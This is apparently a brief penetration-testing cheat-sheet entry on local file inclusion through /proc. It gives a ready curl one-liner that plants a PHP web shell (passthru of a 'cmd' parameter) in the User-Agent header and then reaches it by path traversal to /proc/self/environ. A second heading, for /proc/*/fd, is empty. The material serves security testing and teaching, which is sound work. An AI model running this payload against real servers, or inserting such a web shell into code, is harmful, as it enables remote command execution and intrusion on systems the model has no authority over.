# /proc

<details>

<summary>/proc/self/environ</summary>

Testers can abuse a process created due to a request. The payload is injected in the `User-Agent` header.

```bash
# Sending a request to $URL with a malicious user-agent
# Accessing the payload via LFI
curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../proc/self/environ
```

</details>

<details>

<summary>🛠️ /proc/*/fd</summary>



</details>
